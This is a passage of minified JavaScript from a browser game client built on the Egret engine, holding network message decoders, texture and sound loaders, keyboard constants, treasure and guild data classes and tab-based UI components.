s={"./p0_10.ts":606,"./p0_14.ts":607,"./p0_3.ts":608,"./p0_31.ts":609,"./p0_4.ts":610,"./p0_40.ts":611,"./p0_41.ts":612,"./p0_42.ts":613,"./p0_43.ts":614,"./p0_44.ts":615,"./p0_45.ts":616,"./p0_46.ts":617,"./p0_47.ts":618,"./p0_9.ts":717,"./p100_2.ts":718,"./p100_3.ts":719,"./p100_4.ts":720,"./p100_6.ts":721,"./p100_7.ts":722,"./p101_1.ts":723,"./p101_2.ts":724,"./p101_4.ts":725,"./p101_5.ts":726,"./p10_40.ts":727,"./p1_4.ts":728,"./p1_82.ts":729,"./p2_1.ts":730,"./p2_19.ts":731,"./p2_2.ts":732,"./p2_3.ts":733,"./p2_9.ts":734,"./p30_6.ts":735,"./p37_36.ts":736,"./p3_11.ts":737,"./p3_12.ts":738,"./p3_13.ts":739,"./p3_14.ts":740,"./p3_16.ts":741,"./p3_17.ts":742,"./p3_18.ts":743,"./p3_3.ts":744,"./p49_22.ts":745,"./p49_23.ts":746,"./p4_1.ts":747,"./p4_26.ts":748,"./p4_57.ts":749,"./p4_58.ts":750,"./p4_59.ts":751,"./p4_60.ts":752,"./p50_1.ts":753,"./p50_2.ts":754,"./p50_3.ts":755,"./p58_10.ts":756,"./p58_9.ts":757,"./p6_2.ts":758,"./p79_18.ts":759,"./p79_20.ts":760,"./p7_2.ts":761,"./p8_3.ts":762};n.keys=function(){return Object.keys(s)},n.resolve=o,t.exports=n,n.id=605},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){return t.readDouble()},t}();window.p0_10=i,__reflect(i.prototype,"p0_10",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){return t.readUnsignedInt()},t}();window.p0_14=i,__reflect(i.prototype,"p0_14",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeDouble(e)},t.decode=function(t){return t},t.enterOK=function(){},__decorate([post()],t,"enterOK",null),t}();window.p0_3=i,__reflect(i.prototype,"p0_3",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.handle,o=e.path;void 0===i&&(i=!1),t.writeDouble(n);var s=o.length;t.writeInt(s);for(var a=0;s>a;a++)t.writeInt(o[a].x),t.writeInt(o[a].y);t.writeByte(+i)},t.decode=function(t){return t},t}();window.p0_31=i,__reflect(i.prototype,"p0_31",[])},function(t,e){var i;!function(t){t[t.All=-1]="All",t[t.Actor=0]="Actor",t[t.Role=1]="Role",t[t.Monster=2]="Monster",t[t.Snpc=3]="Snpc",t[t.LadderPlayer=4]="LadderPlayer",t[t.CollectionMonst=5]="CollectionMonst",t[t.DropItem=6]="DropItem",t[t.Pet=7]="Pet",t[t.Ring=8]="Ring",t[t.Fire=10]="Fire",t[t.Npc=100]="Npc",t[t.Transfer=101]="Transfer",t[t.Mine=102]="Mine",t[t.MuBei=103]="MuBei"}(i||(i={})),window.EntityType=i;var n=function(){function t(){}return t.encode=function(t,e){},t.decode=function(t){return t},t.postAdd=function(t,e,n){void 0===n&&(n=!1),t==i.DropItem&&this.addDropItem(e),t==i.Pet&&n&&this.addPet(e),t==i.Role&&n&&this.addRole(e)},t.addDropItem=function(t){return t},t.addPet=function(t){return t},t.addRole=function(t){return t},__decorate([post()],t,"addDropItem",null),__decorate([post()],t,"addPet",null),__decorate([post()],t,"addRole",null),t}();window.p0_4=n,__reflect(n.prototype,"p0_4",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){return t.readDouble()},t}();window.p0_40=i,__reflect(i.prototype,"p0_40",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t){},t.decode=function(t){var e=t.readString(),i=t.readInt(),n=t.readUnsignedByte(),o=t.readInt();return{killerName:e,cd:i,type:n,count:o}},t}();window.p0_41=i,__reflect(i.prototype,"p0_41",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){void 0===e&&(e=0),t.writeByte(e)},t.decode=function(t){var e=t.readByte();return 0==e},t}();window.p0_42=i,__reflect(i.prototype,"p0_42",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeInt(e)},t.decode=function(t){return t},t}();window.p0_43=i,__reflect(i.prototype,"p0_43",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){var e=t.readDouble(),i=t.readUnsignedByte(),n=t.readString();return{handle:e,index:i,model:n}},t}();window.p0_44=i,__reflect(i.prototype,"p0_44",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){if(this.canMove=t.readBoolean(),this.canAtk=t.readBoolean(),this.canMove){for(var e=0,i=this.canMoveFuns;e<i.length;e++){var n=i[e];n()}this.canMoveFuns.length=0}return{canMove:this.canMove,canAtk:this.canAtk}},t.awaitCanMove=function(){var t=this;return new Promise(function(e){Ts.roleStatus.canMove?e():t.canMoveFuns.push(e)})},t.canMove=!0,t.canMoveFuns=[],t}();window.p0_45=i,__reflect(i.prototype,"p0_45",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeDouble(e)},t.decode=function(t){var e=t.readBoolean();return e?{type:t.readInt(),id:t.readInt(),count:t.readInt()}:null},t}();window.p0_46=i,__reflect(i.prototype,"p0_46",[])},function(t,e,i){var n=function(){function t(){}return t.encode=function(t){},t.decode=function(t){var e=t.readDouble(),n=t.readDouble(),o=t.readString();return Promise.resolve().then(function(){return i(37)}).then(function(t){var i=t.EntityManager,s=i.ins().getEntityByHandle(e);s&&(s.infoModel.belongHandle=n,s.infoModel.belongName=o)}),{targetHandle:e,belongHandle:n,name:o}},t}();window.p0_47=n,__reflect(n.prototype,"p0_47",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CompressTextureProcessor=void 0;var n=function(){function t(t,e,i){this.usePackEtc1Ktx=!1,this.ignoreResource=t,this.usePackEtc1Ktx=e,this.savedProcessor=i}return t.prototype.convertURL=function(e,i){for(var n=t.fileSuffix,o=0,s=n;o<s.length;o++){var a=s[o];if(-1!==e.indexOf(a))return e.replace(a,i)}return e},t.prototype.createCompressTextureResourceInfo=function(t){if(this.ignoreResource&&this.ignoreResource(t))return t;var e=egret.Capabilities.supportedCompressedTexture;if(e.pvrtc){var i=this.convertURL(t.url,".pvr.ktx");return{name:i,url:i,type:"pvrtc.ktx",root:t.root}}if(e.etc1){var i=this.convertURL(t.url,".ktx"),n={name:i,url:i,type:"etc1.ktx",root:t.root};return this.usePackEtc1Ktx&&(n.url=this.convertURL(t.url,".pack.etc1.ktx"),n.type="pack.etc1.ktx"),-1!==t.url.indexOf(".png")&&(n.etc1_alpha_url=this.convertURL(t.url,"_alpha.ktx")),n}return t},t.prototype.onLoadStart=function(t,e){var i=this.createCompressTextureResourceInfo(e);return"pvrtc.ktx"===i.type||"etc1.ktx"===i.type||"pack.etc1.ktx"===i.type?t.load(i,i.type):t.load(e,this.savedProcessor)},t.prototype.onRemoveStart=function(t,e){var i=this.createCompressTextureResourceInfo(e);if("pvrtc.ktx"===i.type||"etc1.ktx"===i.type||"pack.etc1.ktx"===i.type)return t.unload(i);var n=t.get(e);n&&n.dispose()},t.fileSuffix=[".png",".jpg","jpeg"],t}();e.CompressTextureProcessor=n,window.CompressTextureProcessor=n,__reflect(n.prototype,"CompressTextureProcessor",["RES.processor.Processor"])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Config=void 0;var n=function(){function t(){}return t}();e.Config=n,window.Config=n,__reflect(n.prototype,"Config",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PlatformSound=void 0;var n=i(14),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.play=function(t,e){void 0===e&&(e=!1);var i=this.getSoundIAC();e&&this.effCache[t]||i&&(i.src=getUrl(RES_RESOURCE+"/"+RES.getResourceInfo(t).url),i.loop=e,this.effCache[t]=i,this.url2url[i.src]=t,i.play())},e.stop=function(t){var e=this.effCache[t];e&&(e.stop(),this.back(e),delete this.url2url[e.src]),delete this.effCache[t]},e.back=function(t){this.soundIACPool.indexOf(t)<=-1&&this.soundIACPool.push(t),delete this.effCache[this.url2url[t.src]],delete this.url2url[t.src]},e.getSoundIAC=function(){var t;return this.soundIACPool.length>0?t=this.soundIACPool.pop():(t=window.platform.createInnerAudioContext(),t.onStop(function(){e.back(t)}),t.onEnded(function(){e.back(t)})),t},e.stopAll=function(){for(var t in this.effCache)this.stop(t)},e.soundIACPool=[],e.effCache={},e.url2url={},e}(n.BaseSystem);e.PlatformSound=o,window.PlatformSound=o,__reflect(o.prototype,"PlatformSound",[]),window.PlatformSound=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EffectModel=void 0;var n=function(){function t(){this.dir=4}return t}();e.EffectModel=n,window.EffectModel=n,__reflect(n.prototype,"EffectModel",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Keyboard=void 0;var n=function(){function t(){}return t.LEFT=37,t.UP=38,t.RIGHT=39,t.DOWN=40,t.KC_1=49,t.KC_2=50,t.KC_3=51,t.KC_4=52,t.KC_5=53,t.KC_6=54,t.KC_7=55,t.KC_8=56,t.KC_9=57,t.KC_0=48,t.A=65,t.B=66,t.C=67,t.D=68,t.E=69,t.F=70,t.G=71,t.H=72,t.I=73,t.J=74,t.K=75,t.L=76,t.M=77,t.N=78,t.O=79,t.P=80,t.Q=81,t.R=82,t.S=83,t.T=84,t.U=85,t.V=86,t.W=87,t.X=88,t.Y=89,t.Z=90,t.SPACE=32,t.BRACE_L=219,t.BACKSLASH=220,t.BRACE_R=221,t.BACK_QUOTE=192,t.ENTER=13,t.KC_BACKSPACE=8,t.KC_TAB=9,t.KC_ENTER=13,t.KC_SHIFT=16,t.KC_CONTROL=17,t.KC_ESCAPE=27,t.KC_SPACE=32,t.KC_WINDOWS=91,t.KC_MENU=93,t}();e.Keyboard=n,window.Keyboard=n,__reflect(n.prototype,"Keyboard",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KeyboardUtils=void 0;var n=i(50),o=i(90),s=i(61),a=function(t){function e(){var e=t.call(this)||this;if(e.key_ups=[],e.key_downs=[],o.DeviceUtils.IsHtml5&&s.LocationProperty.isLocation){var i=e;document.addEventListener("keyup",function(t){for(var e=0,n=i.key_ups.length;n>e;e++){var o=i.key_ups[e][0],s=i.key_ups[e][1];s?o.call(s,t.keyCode):o(t.keyCode)}}),document.addEventListener("keydown",function(t){for(var e=0,n=i.key_downs.length;n>e;e++){var o=i.key_downs[e][0],s=i.key_downs[e][1];s?o.call(s,t.keyCode):o(t.keyCode)}})}return e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.addKeyUp=function(t,e){this.key_ups.push([t,e])},e.prototype.addKeyDown=function(t,e){this.key_downs.push([t,e])},e.prototype.removeKeyUp=function(t,e){for(var i=0;i<this.key_ups.length;i++)this.key_ups[i][0]==t&&this.key_ups[i][1]==e&&(this.key_ups.splice(i,1),i--)},e.prototype.removeKeyDown=function(t,e){for(var i=0;i<this.key_downs.length;i++)this.key_downs[i][0]==t&&this.key_downs[i][1]==e&&(this.key_downs.splice(i,1),i--)},e}(n.BaseClass);e.KeyboardUtils=a,window.KeyboardUtils=a,__reflect(a.prototype,"KeyboardUtils",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharItem2=void 0;var n=i(626),o=i(704),s=i(137),a=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!1,e.touchChildren=!1,e.item=new n.CharItem,e.itemName=new o.CharItemName,e}return __extends(e,t),Object.defineProperty(e.prototype,"infoModel",{get:function(){return this._infoModel},set:function(t){this._infoModel=t,this.item.setData(t.itemData,t.q),this.itemName.setData(t.itemData,t.q),this.x=t.x,this.y=t.y,this.item.scaleX=1,this.item.scaleY=1,this.itemName.scaleX=1,this.itemName.scaleY=1},enumerable:!1,configurable:!0}),e.prototype.addDisplay=function(){this._itemParent?(this._itemParent.addChild(this.item),this._itemParent.addChild(this.itemName)):(s.DropHelp.dropContainer.addChild(this.item),s.DropHelp.dropNameContainer.addChild(this.itemName)),this.item.addRoatEffect(),egret.Tween.removeTweens(this.item);var t=egret.Tween.get(this.item),e=this.item.y;this.item.y-=100,t.to({y:e},500,egret.Ease.bounceOut)},e.prototype.removeDisplay=function(){this.item.parent&&this.item.parent.removeChild(this.item),this.itemName.parent&&this.itemName.parent.removeChild(this.itemName),this.item.removeRoatEffect(),egret.Tween.removeTweens(this.item)},e.prototype.$setX=function(e){return this.itemName.x=e,this.item.x=e,t.prototype.$setX.call(this,e)},e.prototype.$setY=function(e){return this.itemName.y=e,this.item.y=e,t.prototype.$setY.call(this,e)},e}(eui.Component);e.CharItem2=a,window.CharItem2=a,__reflect(a.prototype,"CharItem2",[]),window.CharItem2=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharItem=void 0;var n=i(21),o=i(0),s=i(36),a=i(10),r=i(16),l=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!1,e.touchChildren=!1,e._itemImg=new eui.Image,e._itemImg.x=-17,e._itemImg.y=-17,e._itemImg.scaleX=e._itemImg.scaleY=.6,e.addChild(e._itemImg),e._roatImg=new eui.Image("point3"),e._roatImg.anchorOffsetX=5,e._roatImg.anchorOffsetY=5,e._roatImg.alpha=1,e.addChild(e._roatImg),e}return __extends(e,t),e.prototype.setData=function(t,e){t.type?(this._itemImg.source=a.ItemUtil.getItemSource(o.GlobalConfig.ItemConfig[t.id]),this.addItemEffect(t.id,e)):t.id==s.MoneyConst.gold?this._itemImg.source="icgoods117_png":t.id==s.MoneyConst.yuanbao&&(this._itemImg.source="icgoods121_png")},e.prototype.addRoatEffect=function(){this.removeRoatEffect();var t=egret.Tween.get(this._roatImg,{loop:!0});t.to({alpha:1},200).to({rotation:90},1e3).to({alpha:0},200).wait(300)},e.prototype.removeRoatEffect=function(){this._roatImg.alpha=0,this._roatImg.rotation=0,egret.Tween.removeTweens(this._roatImg)},e.prototype.addItemEffect=function(t,e){var i=o.GlobalConfig.ItemConfig[t];if(i){var s=a.ItemUtil.getDropEffName(i,e);""!=s&&(this._eff||(this._eff=new n.MovieClip),this._eff.playFile(RES_DIR_EFF+s,-1),this.addChild(this._eff))}},e.prototype.removeItemEffect=function(){this._eff&&(r.DisplayUtils.removeFromParent(this._eff),this._eff.stop(),this._eff=null)},e}(egret.DisplayObjectContainer);e.CharItem=l,window.CharItem=l,__reflect(l.prototype,"CharItem",[]),window.CharItem=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EncounterTreasureData=void 0;var n=i(50),o=i(628),s=i(629),a=i(630),r=i(206),l=i(0),h=i(2),u=i(8),p=function(t){function e(){var e=t.call(this)||this;return e.isInit=!0,e.treasureGot=0,e.robLogList=[],e.systemMsg=[],e.taskData=[],e.treasureData=[],e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.parse=function(t){this.treasureData=[],this.robLogList=[],this.systemMsg=[],this.treasureGot=t.readByte();for(var e=t.readByte(),i=0;e>i;i++){var n=new r.TreasureData;n.id=t.readInt(),n.countDown=t.readInt(),this.treasureData.push(n)}for(var a=t.readByte(),i=0;a>i;i++){var n=new o.TreasureRobListDataItem;n.parse(t),this.robLogList.push(n)}for(var l=t.readByte(),i=0;l>i;i++){var n=new s.TreasureSystemMsgData;n.msg=t.readString(),this.systemMsg.push(n)}return[this.treasureData,this.robLogList,this.systemMsg]},e.prototype.parseTaskData=function(t){var e=t.readByte();this.taskData=[];for(var i=0;e>i;i++){var n=new a.TreasureTaskData;n.taskLine=t.readByte(),n.taskId=t.readInt(),n.taskVar=t.readInt(),n.taskStat=t.readInt(),this.taskData.push(n)}return this.taskData},e.prototype.updateTreasureData=function(t){var e=t.readByte(),i=t.readInt(),n=t.readInt(),o=t.readByte();switch(e){case 0:this.treasureData.forEach(function(t,e){e==o-1&&(t.countDown=n)});break;case 1:var s=new r.TreasureData;s.id=i,s.countDown=n,this.treasureData.push(s),l.GlobalConfig.SkirmishTreasureConfig[s.id].quality>1&&h.TipsCT.ins().showTreasureTips(s);break;case 2:var a=[];this.treasureData.forEach(function(t,e){e!=o-1&&a.push(t)}),this.treasureData=a}return[this.treasureData,this.robLogList,this.systemMsg]},e.prototype.hasTimeEndTreasure=function(){var t=this.treasureData[0],e=!1,i=u.DateUtils.formatServerTime((new Date).getTime());if(t){var n=t.countDown-i;0>=n&&(e=!0)}return e},e}(n.BaseClass);e.EncounterTreasureData=p,window.EncounterTreasureData=p,__reflect(p.prototype,"EncounterTreasureData",[]),window.EncounterTreasureData=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TreasureRobListDataItem=void 0;var n=function(){function t(){}return t.prototype.parse=function(t){this.index=t.readUnsignedShort(),this.time=t.readInt(),this.treasureId=t.readInt(),this.logType=t.readUnsignedByte(),this.doerId=t.readInt(),this.doerName=t.readString(),this.toId=t.readInt(),this.toName=t.readString(),this.isWin=t.readUnsignedByte()},t}();e.TreasureRobListDataItem=n,window.TreasureRobListDataItem=n,__reflect(n.prototype,"TreasureRobListDataItem",[]),window.TreasureRobListDataItem=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TreasureSystemMsgData=void 0;var n=function(){function t(){}return t}();e.TreasureSystemMsgData=n,window.TreasureSystemMsgData=n,__reflect(n.prototype,"TreasureSystemMsgData",[]),window.TreasureSystemMsgData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TreasureTaskData=void 0;var n=function(){function t(){}return t}();e.TreasureTaskData=n,window.TreasureTaskData=n,__reflect(n.prototype,"TreasureTaskData",[]),window.TreasureTaskData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LimitTaskData=void 0;var n=function(){function t(){this.id=0,this.name="",this.desc="",this.target=0,this.control=0,this.type=0,this.state=0,this.progress=0}return t.prototype.setBaseData=function(t){this.id=t.id,this.name=t.name,this.desc=t.desc,this.target=t.target,this.awardList=t.awardList,this.control=t.control,this.controlTarget=t.controlTarget,this.type=t.type},t.prototype.parser=function(t){this.progress=t.readInt(),this.state=t.readByte()},t}();e.LimitTaskData=n,window.LimitTaskData=n,__reflect(n.prototype,"LimitTaskData",[]),window.LimitTaskData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.VitalityData=void 0;var n=function(){function t(){}return t}();e.VitalityData=n,window.VitalityData=n,__reflect(n.prototype,"VitalityData",[]),window.VitalityData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AIUtil=void 0;var n=i(50),o=i(146),s=i(23),a=i(69),r=i(53),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.ins=function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return t.ins.call(this,e)},e.prototype.userSkill=function(t,e,i,n){return void 0===n&&(n=null),e?(t!=e&&(t.dir=o.DirUtil.get8DirBy2Point(t,e)),i?(!r.ControlCC.isHideFightingEff&&s.GameLogic.ins().playSkillEff(i,t,[e],n),!a.SoundUtil.WINDOW_OPEN&&i.sound&&t.data.isMy&&a.SoundUtil.play(i.sound),!0):!1):!1},e}(n.BaseClass);e.AIUtil=l,window.AIUtil=l,__reflect(l.prototype,"AIUtil",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MapGridNode=void 0;var n=function(){function t(){}return Object.defineProperty(t.prototype,"hidden",{get:function(){return(2&this.flags)>0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"walkable",{get:function(){return(1&this.flags)>0},enumerable:!1,configurable:!0}),t.FLAG_WALKABLE=32768,t.FLAG_HIDDEN=16384,t}();e.MapGridNode=n,window.MapGridNode=n,__reflect(n.prototype,"MapGridNode",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BresenhamLine=void 0;var n=i(20),o=function(){function t(){}return t.isAbleToThrough=function(t,e,i,o){var s=0,a=0,r=0,l=0,h=0,u=0,p=0,d=0,c=0,f=0,g=0,m=0,v=0,y=0;for(this.throughCheckResult||(this.throughCheckResult=new Array(4)),this.throughCheckResult[0]=0,this.throughCheckResult[1]=0,m=(o-e)/(i-t),v=o-m*i,h=i>t?1:-1,u=o>e?1:-1,s=t>>0,a=e>>0,r=i>>0,l=o>>0,p=r-s,p=(p^p>>31)-(p>>31),d=s,f=a,this.throughCheckResult[2]=d,this.throughCheckResult[3]=f,y=0;p>y;y++){for(d+=h,g=m*d+v,c=g>>0;f!=c;){if(f+=u,!n.GameMap.checkWalkable(d,f))return this.throughCheckResult;this.throughCheckResult[2]=d,this.throughCheckResult[3]=f}if(!n.GameMap.checkWalkable(d,c))return this.throughCheckResult;this.throughCheckResult[2]=d,this.throughCheckResult[3]=c}for(;f!=l;){if(f+=u,!n.GameMap.checkWalkable(d,f))return this.throughCheckResult;this.throughCheckResult[2]=d,this.throughCheckResult[3]=f}return this.throughCheckResult[0]=1,this.throughCheckResult},t.tileLine=function(t,e,i,n){for(var o=(n-e)/(i-t),s=n-o*i,a=i>t?1:-1,r=Math.abs(i-t),l=[],h=0;r>h;++h){var u=t+h*a>>0,p=o*u+s>>0;l.push(u),l.push(p)}return l},t.getPointOnLine=function(t,e,i,n,o){var s=0,a=0,r=0,l=0;return r=i-t,l=n-e,s=Math.sqrt(r*r+l*l),a=s+o,[Math.round(t+r*a/s),Math.round(e+l*a/s)]},t.shortenPath=function(e,i,n,o){var s,a=e,r=i,l=n[n.length-2],h=n[n.length-1],u=0,p=0;n.length>=4&&(a=n[n.length-4],r=n[n.length-3]),u=l-a,p=h-r,u*u+p*p>o*o?(s=t.getPointOnLine(a,r,l,h,-o),n[n.length-2]=s[0],n[n.length-1]=s[1]):n.length-=2},t}();e.BresenhamLine=o,window.BresenhamLine=o,__reflect(o.prototype,"BresenhamLine",[]),window.BresenhamLine=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BaseTabEUI=void 0;var n=i(211),o=i(12),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),Object.defineProperty(e,"panelNames",{get:function(){return this._panelNames},set:function(t){this._panelNames=t},enumerable:!1,configurable:!0}),e.prototype.getPanel=function(t){var e=egret.getQualifiedClassName(t),i=egret.getDefinitionByName(e),n=this.getShowPanelNames().indexOf(i);return-1==n&&console.error("BaseTabEUI.getPanel panel : "+i+" 找不到 index:"+n,0),e=e+"_"+n,this[e]},e.prototype.getShowPanelNames=function(){return this._showPanelNames=this._showPanelNames||this.getThisDef().getShowPanelNames(),this._showPanelNames},e.prototype.getTab=function(t){var e;return e="number"==typeof t?t:this.getShowPanelNames().indexOf(t),this.baseTab?this.baseTab.getElementAt(e):null},e.prototype.getViewStack=function(t){var e;return e="number"==typeof t?t:this.getShowPanelNames().indexOf(t),this.baseViewStack?this.baseViewStack.getElementAt(e):null},e.prototype.getThisDef=function(){var t=egret.getQualifiedClassName(this);return egret.getDefinitionByName(t)},e.prototype.isShow=function(){return null!=this.stage&&this.visible},e.prototype.getSysId=function(){return this.getThisDef().getSysId()},e.prototype.openWinByTabs=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t,n=this.getViewStack(i[0]);this.changeView(i[0]||0);for(var o=1;o<i.length;o++){var s=i[o];if(!n||!n.changeView)return;n.changeView(s),n=n.getViewStack(s)}},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.baseTab&&(this.baseTab.selectedIndex=t[0]||0,this.baseViewStack&&(this.baseViewStack.selectedIndex=t[0]||0))},e.getShowPanelNames=function(){for(var t=this.panelNames||[],e=[],i=0;i<t.length;i++){var n=t[i];n.isShow()&&e.push(n)}return e},e.isShow=function(){var t=this.getSysId();return-1==t?!0:o.OpenSystem.ins().checkSysOpen(t)},e.getSysId=function(){return-1},e.prototype.initUI=function(){this.baseTab&&(this.setTabItem(),this.baseTab.dataProvider=this.tabDataProvider=new eui.ArrayCollection(this.getTabDatas()),this.baseTab.selectedIndex=0)},e.prototype.setTabItem=function(){this.baseTab.itemRenderer=n.TabBarItemRender},e.prototype.getTabDatas=function(){for(var t=[],e=this.getShowPanelNames(),i=0,n=e;i<n.length;i++){var o=n[i],s=o.getTabTitle();s&&""!=s?t.push(s):console.warn(o.name+"缺少getTabTitle方法或getTabTitle不能为空")}return t},e.prototype.removeFromParent=function(){this.parent&&this.parent.removeChild(this)},e._panelNames=[],e}(eui.Component);e.BaseTabEUI=s,window.BaseTabEUI=s,__reflect(s.prototype,"BaseTabEUI",["IBaseTabEUI"]),window.BaseTabEUI=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ErrorLogWin=e.ErrorLog=void 0;var n=i(1),o=function(){function t(){this.stackObj={stack:""}}return t.ins=function(){return this._ins=this._ins||new t,this._ins},t.prototype.show=function(t){win.open(s,t)},t.httpLog=!0,t}();e.ErrorLog=o,window.ErrorLog=o,__reflect(o.prototype,"ErrorLog",[]);var s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ErrorSkin",e.layoutNum=1,e}return __extends(e,t),e.prototype.skinComplete=function(){var t=this;this.addTouchEvent(this.notBtn,function(){return win.close(t)})},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.lab.text=t[0]},e}(n.BaseView);e.ErrorLogWin=s,window.ErrorLogWin=s,__reflect(s.prototype,"ErrorLogWin",[]),window.ErrorLogWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSkillInfo=void 0;var n=function(){function t(){}return t}();e.GuildSkillInfo=n,window.GuildSkillInfo=n,__reflect(n.prototype,"GuildSkillInfo",[]),window.GuildSkillInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildTaskInfo=void 0;var n=function(){function t(){}return t}();e.GuildTaskInfo=n,window.GuildTaskInfo=n,__reflect(n.prototype,"GuildTaskInfo",[]),window.GuildTaskInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildRoleSkillInfo=void 0;var n=function(){function t(){this.guildSkillInfo=[],this.practiceSkillInfo=[]}return t}();e.GuildRoleSkillInfo=n,window.GuildRoleSkillInfo=n,__reflect(n.prototype,"GuildRoleSkillInfo",[]),window.GuildRoleSkillInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildMapMemberItemRender=void 0;var n=i(3),o=i(136),s=i(106),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data instanceof o.GuildMemberInfo){var t=this.data;t&&(this.nameLab.text=t.name,this.office.text=s.GuildLanguage.guildOffice[t.office],this.conLab.text=t.curContribution+"")}},e}(n.BaseItemRender);e.GuildMapMemberItemRender=a,window.GuildMapMemberItemRender=a,__reflect(a.prototype,"GuildMapMemberItemRender",[]),window.GuildMapMemberItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DressTimeInfo=void 0;var n=function(){function t(){}return t}();e.DressTimeInfo=n,window.DressTimeInfo=n,__reflect(n.prototype,"DressTimeInfo",[]),window.DressTimeInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DressPosInfo=void 0;var n=function(){function t(){this.posAry=[]}return t}();e.DressPosInfo=n,window.DressPosInfo=n,__reflect(n.prototype,"DressPosInfo",[]),window.DressPosInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixReinTeam=void 0;var n=function(){function t(){}return t.prototype.parse=function(t){this.roleID=t.readInt(),this.position=t.readByte(),this.roleName=t.readString(),this.job=t.readByte(),this.title=t.readInt(),this.outward=t.readInt(),this.power=t.readDouble(),this.lv=t.readUnsignedShort(),this.pos=t.readInt(),this.layer=t.readUnsignedByte()},t}();e.SixReinTeam=n,window.SixReinTeam=n,__reflect(n.prototype,"SixReinTeam",[]),window.SixReinTeam=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestResultWin=void 0;var n=i(1),o=i(74),s=i(8),a=i(298),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.closeTime=5,e.bolDef=!1,e.bgImgList=["","teamFb_win_png","teamFb_lose_png","teamFb_draw_png"],e._sn_="ContestResultSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eSureBtn.name=this.eSureBtn.label,this.eList.itemRenderer=a.ContestMateItem
